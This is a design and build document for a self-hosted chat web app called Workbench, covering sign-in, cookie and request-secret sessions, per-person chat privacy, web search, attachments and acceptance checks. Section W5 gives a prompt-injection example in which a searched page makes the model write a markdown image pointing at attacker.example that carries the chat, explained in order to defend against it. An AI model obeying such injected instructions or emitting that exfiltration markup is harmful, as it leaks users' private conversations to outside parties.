# C3: Workbench, version 1

**Status: designed 2026-10-01, and built the same day**
([record](../acceptance/c3-workbench-run.md)); §10 says where the build
departed from this. Slice C3 of [`workbench.md`](workbench.md) §5, after C1
(an OS account per app) and C2
([`sign-in-with-eugene.md`](sign-in-with-eugene.md)). Troy took the three
calls in §9 the same day. Repo: `eugene-plexus/workbench`.

## 0. What exists to build on

Measured 2026-10-01:

- **The registry runs an app with five things** (`agent.yaml`
  `AppManifest`): a port, a data directory, a key file, the gateway's
  address and, for `signIn`, the issuer, a client id and a secret file.
  The catalogue the agent ships is empty. Workbench is its first entry.
- **The app's key** is minted with A5's default limits plus `writeLogs`:
  every model, every server-run tool, 2 requests at once, 60 a minute.
  Every person using Workbench shares it (sign-in call 1: per-person
  usage is a later slice).
- **The issuer** handed to an app is its own node's agent at the
  advertised host, else loopback. The redirect URIs registered are that
  host, `127.0.0.1` and `localhost`, on the app's port.
- **Web search on chat** is `web_search_options` (P8). It runs when a
  search account is up, the key's `allowedTools` permits it, the key is
  not `localOnly`, and the model searches itself or calls tools.
  Otherwise the chat door answers 400 with the reason.
- **No public answer says whether a search can run** before a request is
  sent. `GET /v1/models` says which models call tools, not whether this
  key, on this install, can have a search run. The console's playground
  finds out by sending. That is a gap in the contract (§3).
- **The stream already carries** what an answer needs: `content`,
  `reasoning_content`, `annotations` (citations), progress chunks
  (`include_progress`, a search shows as `stage: tool`), and
  `x_eugene_plexus.web_searches` on the final frame.

## 1. What version 1 is

A browser app on its own port, served by its own process:

- **Chats**, a list down the side: new, rename, delete.
- **Streaming answers**, with Stop, Try again and editing a message.
- **Markdown and code**, with a copy button on each code block.
- **Reasoning**, shown collapsed.
- **A model picker**, saying each model's context window and what it
  takes (images, PDFs, audio).
- **Attachments**: images, PDFs and audio.
- **Settings for a chat**: instructions (the system prompt), temperature,
  top-p and the longest answer. Each unset value says the model's
  default is used.
- **Tools: Search the web**, a switch. When a search cannot run, the
  switch is off and says why.
- **Sign in with Eugene**, and sign out.

The words are plain (call 1): *Tools*, not *Toolbox*. The workshop names
in `workbench.md` §6 start when there is more than one tool.

## 2. Decisions

### W1. The answer is the server's, not the tab's

The browser asks; Workbench's server runs the answer against the gateway
and keeps it.

- **Every tab watching a chat gets the same answer as it arrives.** A
  tab that opens mid-answer gets what has arrived so far, then the rest.
- **An answer keeps going when every tab is closed** (call 2), and is
  saved as it arrives. Only Stop ends it.
- **A restart of Workbench mid-answer** keeps what had arrived and marks
  the answer *interrupted*, with that word on screen.
- **Try again** replaces the last answer. **Editing a message** replaces
  it and everything after it, then asks again. Kept versions of an
  answer are a later change.

### W2. Signing in

OpenID Connect against Eugene (C2): the authorization code flow with
PKCE (S256), `state` and `nonce`, through Authlib, the client library
Open WebUI uses.

- **Who someone is** is the ID token's `sub` and its issuer. The name
  shown is its `name`. `eugene_role: operator` is the owner.
- **Every 10 minutes of use, the sign-in is refreshed**, as C2 expects of
  an app. A refused refresh ends the Workbench session, and the next
  screen says so: *Eugene no longer accepts this sign-in; the owner may
  have turned your account off.*
- **A Workbench session** lasts as long as Eugene's refresh token (30
  days), then asks again.
- **Sign out** revokes the refresh token at Eugene (RFC 7009) and ends the
  session.

### W3. A session needs two things, because cookies ignore ports

A browser sends a cookie for a host to every port on it. On a home
network's plain `http`, there is no `__Host-` prefix and no `Secure`, so
Workbench's cookie would reach every other service on the machine: the
console, and Open WebUI when C4 puts it beside Workbench. Open WebUI runs
its admin's tools in its own process, so a tool there could read
Workbench's cookie and every chat of whoever holds it.

So a session is **an `HttpOnly` cookie and a request secret**, and every
API call needs both:

- The secret lives in the page's own storage, which a browser keeps per
  origin, port included. It arrives once, in the address fragment of the
  redirect that finishes signing in. A fragment is never sent to a
  server.
- **A cookie alone is refused.** So another port's server holding the
  cookie gets nothing. A script on that other origin gets nothing either:
  it cannot read Workbench's storage.
- The secret is a header, so it is also the CSRF defence. Every changing
  call also checks `Origin`.
- Files are fetched with the header and shown from a `blob:` address, as
  an `<img src>` cannot carry one.

The residual risk is a script running *in* Workbench's own page, which
holds both. W5 is what keeps one out.

### W4. People's chats are their own, unless the business decides otherwise

- **Every chat and file belongs to one person** (`sub`). Every read and
  write is filtered by it.
- **Whether the owner may read people's chats is a Workbench setting,
  `ownerReadsChats`, off by default** (call 3: each business decides). It
  is on Workbench's settings page in the console, beside the app.
- **While it is on**, the owner gets a read-only list of each person's
  chats, and **every person sees a standing line** above their chats:
  *The owner of this Workbench can read your chats.* The setting says it
  applies to every chat, including those written before it was turned on.
- **A person removed in Eugene** can no longer sign in, and their chats
  stay stored. Deleting a former person's chats is a later slice.

### W5. Model output is untrusted

- **Markdown, with no raw HTML**: `react-markdown` without `rehype-raw`.
- **An image in an answer is shown as a link, never fetched.** A page the
  model read in a search can tell it to write
  `![](https://attacker.example/?q=<the chat>)`, and rendering that image
  sends the chat away. The Content Security Policy also allows images
  only from Workbench itself, `data:` and `blob:`.
- **Links open in a new tab** with `noopener noreferrer`. Only `http`,
  `https` and `mailto` links are links.
- **The Content Security Policy** allows scripts and styles from
  Workbench's own origin only, with nothing inline, and no framing.

### W6. Search: ask, and say why not

- **The switch sends `web_search_options: {}`**, as any client does.
- **Whether it can be on** comes from `GET /v1/models` (§3): the install
  and this key, and then the chosen model. Off, it gives the gateway's
  own reason, such as *no search account is set up; add one under
  Backends, then Add a search account*.
- **A refused search is shown with the gateway's reason**, and the turn is
  kept, so it can be sent again without search.
- **Sources:** the answer's `url_citation`s, listed under it as links,
  plus how many searches ran.

### W7. Attachments are files, kept per person

- **Stored in the app's data directory**, `files/<person>/<id>`, by id.
  The database holds the name, type, size and owner, never the bytes.
- **Images** are sent as PNG or JPEG, the two the gateway carries (P2a).
  Others are converted in the browser before upload. **PDFs** go as file
  parts, **audio** (WAV, MP3) as `input_audio`.
- **The picker says which models take each.** A model that does not
  confirm one is not offered with it, and the gateway's refusal is shown
  when it happens anyway.
- **The size limits are the gateway's**, said before upload rather than
  after a refusal: an image at most 5 MiB, audio or a PDF at most 10 MiB,
  and every attachment in a chat together at most 11 MiB, because the
  whole conversation travels in each request (`MessageContent`). A chat
  that is full says to start a new one.

### W8. Storage behind one interface

SQLite in the data directory, in WAL mode, behind a `Store` class whose
methods are the only way in. A Postgres store, when a business outgrows
SQLite, implements the same class. No migration tool yet: a schema
version table, and each version's changes in code.

### W9. The front end is a single-page app

React and TypeScript with Tailwind, built by Vite to static files that
Workbench's server serves, with every unknown path answered by the app.
The console's Plexus tokens are copied, not shared. Not Next.js, which
the console uses: a static export cannot pre-render a chat's address, and
its segment prefetches 404 on every page (found in C2).

### W10. Shipping

The registry installs from a GitHub archive at a pinned commit, and an
archive has no build output. So Workbench has a **`dist` branch**, as
`ui` does: each commit is `main` at a named commit plus the built front
end. The agent's catalogue names a `dist` commit. The acceptance run
installs from that archive, never from a working tree.

### W11. The key is everyone's, and says so

Every person shares the app's key and its limits (2 at once, 60 a minute
by default). A refusal for a limit says which limit, and that the owner
raises it on the key in the console. Revoking the key stops every
answer, with a sentence saying the key was turned off in Eugene's
console.

### W12. Logs

Workbench writes its log to its standard output. The registry's launcher
forwards that to the agent's ingress under the app's key name (C1), or
the agent's own supervisor collects it where there is no apps account.

### W13. Settings

Workbench serves the config trio the registry expects of apps we ship
(`configTrio`), with the admin token the agent hands it. It has one
setting, `ownerReadsChats` (W4), off by default, which takes effect at
once. A file-size setting would have to stay under the gateway's own
limits, so there is none (W7).

## 3. The contract change: can a search run here?

`gateway.yaml` gains two fields, so every client can know before it asks
(apps call #1: a gap is fixed in the contract, for everyone):

- **`ModelList.x_eugene_plexus.web_search`**: `{available, reason}`.
  Whether a search can run for *this key* on *this install*: a search
  account is up, the key's `allowedTools` permits it and it is not
  `localOnly`. `reason` is the gateway's own words when it cannot,
  exactly what a refused request would say.
- **`ModelRoutingInfo.web_search`**: whether a search can reach this
  model: a backend serving it searches itself or calls tools.

The two together decide the switch. Nothing else in the gateway changes.

## 4. Order

1. **Contract** (§3), regenerated in every consumer it reaches.
2. **gateway:** the two fields.
3. **workbench:** the server, then the front end, then its tests and CI.
4. **The `dist` branch**, and the repo on GitHub.
5. **agent:** Workbench in the catalogue at that `dist` commit.
6. **The failing check first, then a sabotage pass** (§5).
7. Both installers re-pinned.

## 5. The checks

`scripts/c3-workbench-acceptance.py`. Real processes on ephemeral ports: a
control root, an agent, a gateway, an inference-driver over a fixture
engine that calls tools, and a tool-driver over a fixture SearXNG.
Workbench is installed through the registry from the agent's catalogue,
at the pinned archive. Chrome drives it. `--live` adds a real local model
and the WSL SearXNG.

- **Sign in with the Eugene passphrase**, a chat, a streamed answer,
  Stop, an attachment, a searched answer with its sources.
- **An answer survives its tab:** close the tab mid-answer, open another,
  and the whole answer is there.
- **Two people, one Workbench.** Each sees only their own chats. Turning
  one off in Eugene ends that person's session within a refresh, and the
  other keeps working.
- **`ownerReadsChats`** is off: the owner cannot open a person's chat.
  On: the owner can, read-only, and the person sees the line saying so.
- **A cookie alone is refused**, and so is a call without the right
  `Origin`.
- **An image an answer names is not fetched.**
- **The gateway's records show only the app's key.** Revoking the key
  stops the next answer, with a sentence saying so.
- **The switch is off with the reason** when no search account is up,
  and when the key's tools deny search. A searched turn on such a key is
  refused with the gateway's reason.
- **Workbench talks to its node's agent and the gateway only**, and its
  logs appear on the Logs page under its key's name.

**Before C3 every step fails**: the catalogue has no Workbench.

## 6. Not in this slice

- Kept versions of an answer (W1).
- Deleting a former person's chats (W4).
- Per-person usage at the gateway (sign-in call 1).
- Images, speech, transcription and video as their own screens. The
  doors exist; Workbench's screens for them come later.
- MCP servers, file tools and local media models (`workbench.md` §8).
- The working animation (`workbench.md` §6.1).

## 9. Calls taken (Troy, 2026-10-01)

| # | The call | Taken |
| --- | --- | --- |
| 1 | The workshop names in version 1 | **Plain words.** *Tools*, not *Toolbox*; the workshop names start when there is more than one tool |
| 2 | An answer with no tab open | **Keeps going and is saved** (W1) |
| 3 | Whether the owner may read people's chats | **A setting, so each business decides** (W4), off by default |

## 10. Where the build departed (2026-10-01)

Record: [`../acceptance/c3-workbench-run.md`](../acceptance/c3-workbench-run.md).

- **Each piece of an answer says where it goes (W1).** A tab loads the chat
  and opens its stream at once, and the two race. So every streamed piece
  carries its offset, counted in the page's own string length (UTF-16
  units, so an emoji is two). A piece already there is skipped; one that
  would leave a gap makes the tab load the chat again.
- **A searched answer that links nothing says it searched (W6).** It shows
  how many searches ran and that it links none of the pages found, so it
  never looks like an answer that did not search. Found writing the live
  check, where a small model searched and cited nothing.
- **The switch and the model picker change at once.** The chat on the
  server follows, and a refusal puts them back with the reason. Found in
  Chrome, where the switch waited for the server.
- **Eugene unreachable at a refresh is not a sign-out (W2).** It is a 503
  that says so; the session works again when Eugene answers. Nobody can be
  turned off while Eugene cannot be asked either.
- **The return address is the address the browser used.** Workbench sends
  Eugene `<the page's own origin>/oidc/callback`, one of the addresses the
  agent registered. An address it did not register (a host name the
  operator added later) is refused by Eugene's page, which says so.
- **No file-size setting (W7, W13).** The limits are the gateway's, said
  before an upload.
- **`dist` is built from a `git archive` of `main`, and that stamps
  `_build.py`.** The stamp must stay a placeholder on `dist`, so that an
  archive of `dist` names its own commit; the first rebuild got this wrong
  and a follow-up commit put it back. `BUILD_INFO` names the `main` commit.
